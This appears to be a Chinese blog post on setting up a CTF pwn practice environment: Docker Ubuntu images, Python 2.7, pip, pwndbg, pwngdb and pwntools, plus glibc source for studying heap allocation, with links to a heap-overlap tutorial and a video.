+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">docker pull ubuntu:16.04</span><br><span class="line">docker pull ubuntu:18.04</span><br><span class="line">docker pull ubuntu:20.04</span><br></pre></td></tr></table></div></figure>
+
+<p>二、环境安装:</p>
+<p>1.apt换源，docker换源，pip换源。</p>
+<p>2.安装前置包：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">sudo apt-get install libxml2-dev</span><br><span class="line">sudo apt-get install libxslt-dev</span><br><span class="line">sudo apt-get install libmysqlclient-dev</span><br><span class="line">sudo apt-get install libsqlite3-dev</span><br><span class="line">sudo apt-get install zlib1g-dev</span><br><span class="line">sudo apt-get install python-dev</span><br><span class="line">sudo apt-get install libffi-dev</span><br><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></div></figure>
+
+<p>3.安装python好多步部曲：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">wget https://www.python.org/ftp/python/2.7.9/Python-2.7.9.tgz</span><br><span class="line">(wget https://www.python.org/ftp/python/3.9.0/Python-3.9.0.tgz)</span><br><span class="line">tar -zxvf Python-2.7.9.tgz</span><br><span class="line">cd Python-2.7.9</span><br><span class="line">./configure --prefix=/usr/local/python27</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">ln -s /usr/local/python27/bin/python /usr/bin/python2</span><br></pre></td></tr></table></div></figure>
+
+<p>4.安装setuptools四部曲：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">wget https://pypi.python.org/packages/45/29/8814bf414e7cd1031e1a3c8a4169218376e284ea2553cc0822a6ea1c2d78/setuptools-36.6.0.zip#md5=74663b15117d9a2cc5295d76011e6fd1</span><br><span class="line">unzip setuptools-36.6.0.zip</span><br><span class="line">cd setuptools-36.6.0</span><br><span class="line">python2 setup.py install</span><br></pre></td></tr></table></div></figure>
+
+<p>5.安装pip四部曲：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">wget https://pypi.python.org/packages/11/b6/abcb525026a4be042b486df43905d6893fb04f05aac21c32c638e939e447/pip-9.0.1.tar.gz#md5=35f01da33009719497f01a4ba69d63c9</span><br><span class="line">tar -zxvf pip-9.0.1.tar.gz</span><br><span class="line">cd pip-9.0.1</span><br><span class="line">python2 setup.py install</span><br><span class="line">ln -s /usr/local/python27/bin/pip2.7 /usr/bin/pip2</span><br></pre></td></tr></table></div></figure>
+
+<p>6.安装pwndbg三部曲:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></div></figure>
+
+<p>7.添加pwngdb:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">cd ~</span><br><span class="line">git clone https://github.com/0xKira/pwngdb.git</span><br><span class="line">vim ~/.gdbinit</span><br><span class="line">#将peda注释，添加：(必须加在第一行)</span><br><span class="line">source ~/pwndbg/gdbinit.py</span><br></pre></td></tr></table></div></figure>
+
+<p>8.安装pwntools一步曲：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">pip2 install pwntools</span><br><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></div></figure>
+
+<p>三、准备源码：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">http://ftp.gnu.org/gnu/glibc/</span><br></pre></td></tr></table></div></figure>
+
+<p>挂飞机下gz包老快了，找到里面的malloc.c准备开始阅读。</p>
+<p>四、跟着CTFwiki一步步调试：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/" >https://wiki.x10sec.org/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>五、视频调试：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1q5411h7Wf" >https://www.bilibili.com/video/BV1q5411h7Wf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/4/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/6/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">93</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">40</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">43</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
